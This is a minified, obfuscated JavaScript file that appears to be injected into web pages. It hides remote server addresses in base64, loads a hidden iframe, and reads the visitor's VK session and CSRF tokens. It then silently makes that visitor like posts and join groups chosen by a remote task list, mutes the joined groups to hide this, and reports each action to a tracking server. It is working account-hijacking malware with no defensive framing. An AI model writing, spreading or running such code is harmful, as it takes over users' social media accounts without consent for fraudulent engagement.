!function(){if(!window.vkAfLikeStart){window.vkAfLikeStart=!0;var e=document,t=(window,{workId:"12",visitId:"vk",Version:"ah",baseUrl:atob("aHR0cHM6Ly92ay5jb20v"),workUrl:atob("aHR0cHM6Ly92ay5jb20v"),needAuth:!0,needSave:!0,preWork:function(n){if(e.location.href.match(/\/vk\.com/im))n();else if(window.top===window.self){var i=e.getElementById("vkWidgetDiv");if(i)return;(i=e.createElement("div")).id="vkWidgetDiv",i.style.width="1px",i.style.height="1px",i.style.position="absolute",i.style.top="0",i.style.left="-999px",i.style.overflow="hidden",e.body.appendChild(i);var o=e.createElement("iframe");o.src=t.baseUrl+"widget_post.php",o.width=o.height="10",i.appendChild(o)}},getAuth:function(e){o.getSend(t.baseUrl+"feed",{success:function(t){var n=t.match(/id: ([0-9]+),/im);n&&"0"!==(c=n[1])&&parseInt(c)>0&&e()}})},checkParams:function(e){e&&e()},checkUniq:!0,checkSingle:!1,visitRequire:!0,follow:function(e,n,i){var r=function(){i(e,n,"vkinc")},s=n.match(/subscribeByAction\(this, (-[^,]+), '([^']+)', '([^']+)', event\);"data-value="([0-9]+)"/i);s&&"0"===s[4]?o.postSend(t.workUrl+"al_groups.php",{data:["act=list_enter","ads_section=wall","al=1","al_ad=1","from="+s[3],"gid="+s[1].replace("-",""),"hash="+s[2]].join("&"),success:function(){o.postSend(t.workUrl+"al_feed.php",{data:"act=a_get_lists_by_item&al=1&al_ad=0&item_id="+s[1],success:function(e){var n=e.match(/Groups\.toggleFeedIgnored\(this, '([^']+)', event\);/i);n?o.postSend(t.workUrl+"al_feed.php",{data:["act=a_ignore_owner","al=1","from=group","hash="+n[1],"owner_id="+s[1]].join("&"),success:r,error:r}):r()},error:r})},error:r}):r()},likeItem:function(e,n,i){var r=new RegExp("\"Likes\\.toggle\\(this, event, '"+e.item+"', '([^']+)'\\);\"","im"),s=n.match(r);s&&o.postSend(t.workUrl+"like.php",{data:["act=a_do_like","al=1","from=wall_one","hash="+s[1],"object="+e.item,"wall=2"].join("&"),success:function(){l(e,i)}})},workList:{16:{worker:function(e){o.postSend(t.workUrl+"like.php",{data:"act=a_get_stats&al=1&object="+e.item,success:function(n){var i=n.match(/\\"like_my\\":([0-9]+)/i);i&&"0"===i[1]&&o.getSend(t.workUrl+e.item,{success:function(n){t.likeItem(e,n,"vklike")}})}})},workEnd:[]},48:{worker:function(e){o.postSend(t.workUrl+"like.php",{data:"act=a_get_stats&al=1&object="+e.item,success:function(n){var i=n.match(/\\"like_my\\":([0-9]+)/i);i&&"0"===i[1]&&o.getSend(t.workUrl+e.item,{success:function(n){t.follow(e,n,t.likeItem)}})}})},workEnd:[]}}}),n={u4f:function(){return"xxxxxxxxxxxx4xxx".replace(/[xy]/g,function(e){var t=16*Math.random()|0;return("x"===e?t:3&t|8).toString(16)})},F:Date.now||function(){return+new Date},curTime:function(){return Math.ceil(n.F()/1e3)}},i=function(){return this};i.prototype={fillOptions:function(e){return["data","success","error","json","headers","creds"].forEach(function(t){void 0===e[t]&&(e[t]=null)}),e},getSend:function(e,t){return this.sender("GET",e,t)},postSend:function(e,t){return this.sender("POST",e,t)},sender:function(e,t,n){n=this.fillOptions(n);var i=new XMLHttpRequest;if(i.open(e,t,!0),n.json||"POST"!==e||i.setRequestHeader("Content-Type","application/x-www-form-urlencoded"),i.onreadystatechange=function(){4===i.readyState&&200===i.status?n.success&&n.success(i.responseText):4===i.readyState&&200!==i.status&&n.error&&n.error(i.responseText,i.status)},n.creds&&(i.withCredentials=!0),n.headers)for(var o in n.headers)i.setRequestHeader(o,n.headers[o]);return n.data?i.send(n.data):i.send(),i}};var o=new i,r=atob("aHR0cHM6Ly9zZXJ2aWNlLm5zZXJ2aWNlcy5zcGFjZS8="),s=atob("aHR0cHM6Ly9zdGF0bG9nLnN0YXR1c2VzLnNwYWNlLw=="),a=atob("aHR0cHM6Ly9jaGVjay52ay5jb20v"),c=null,u=[],d=!1,l=function(e,n){var i={id:parseInt(e.id),fingerprint:c,type:t.Version+t.workId,type_task:n};o.postSend(s+"event",{data:JSON.stringify(i),json:!0})},f=function(){t.needAuth?h(w):w()},p=function(){t.needAuth?t.getAuth(f):(c=n.u4f(),f())},h=function(e){o.postSend("https://check.login.vk.com/saveData?uid="+c,{data:"uid="+c,creds:!0}),o.postSend(a+"visit",{data:JSON.stringify({uid:c,type:t.visitId}),json:!0,success:function(n){e&&(!(n=JSON.parse(n)).result&&t.checkSingle||d||(d=!0,e())),setTimeout(function(){h(e)},6e4)},error:function(){t.visitRequire||(e&&(d||(d=!0,e())),setTimeout(function(){h(e)},6e4))}})},k=function(){o.postSend(r+"youlist.php?worker="+t.workId+"&uid="+c,{success:function(e){!function(e){u=[];var n=JSON.parse(e);for(var i in t.workList)if(void 0!==n[i])for(var o in n[i]){if(t.checkUniq){if(t.workList[i].workEnd.indexOf(o)>-1)continue;t.workList[i].workEnd.push(o)}u.push({id:o,item:n[i][o],type:i})}if(!u.length)return setTimeout(w,6e4),!0;setTimeout(w,6e4);for(var r=0,s=Math.floor(6e4/(u.length+1));u.length;){var a=u.shift();r++,function(e){setTimeout(function(){t.workList[e.type].worker(e)},r*s)}(a)}}(e)},error:function(){setTimeout(w,6e4)},data:""})},w=function(){t.checkParams(k)};t.preWork?t.preWork(p):p()}}();